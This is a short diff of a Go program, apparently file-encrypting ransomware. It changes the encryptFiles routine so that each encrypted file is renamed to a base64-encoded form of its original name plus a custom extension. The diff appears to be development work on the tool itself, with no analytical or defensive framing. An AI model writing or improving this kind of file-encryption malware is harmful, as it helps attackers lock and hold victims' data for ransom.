@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/base64"
 	"encoding/hex"
 	"fmt"
 	"io/ioutil"
@@ -8,6 +9,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"strings"
 	"sync"
 	"time"
 
@@ -149,8 +151,8 @@ func encryptFiles() {
 						return
 					}
 
-					// Write a new file with the encrypted content followed by the custom extension
-					err = ioutil.WriteFile(file.Path+cmd.EncryptionExtension, ciphertext, 0600)
+					newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
+					err = ioutil.WriteFile(newpath+cmd.EncryptionExtension, ciphertext, 0600)
 					if err != nil {
 						log.Println(err)
 						return
